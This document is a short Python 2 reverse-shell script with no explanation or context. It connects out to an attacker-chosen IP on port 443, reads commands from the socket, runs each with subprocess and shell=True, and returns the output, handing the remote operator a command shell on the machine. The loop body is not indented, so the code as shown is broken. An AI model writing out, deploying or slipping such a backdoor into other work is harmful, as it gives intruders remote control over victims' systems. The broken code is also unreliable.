#!/usr/bin/python

import subprocess,socket

HOST = 'Your IP Adress'
PORT = 443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))
s.send('Hello There!')

while 1:
data = s.recv(1024)
if data == "quit": break

proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

stdoutput = proc.stdout.read() + proc.stderr.read()

s.send(stdoutput)

# loop ends here
s.send('Bye now!')
s.close()
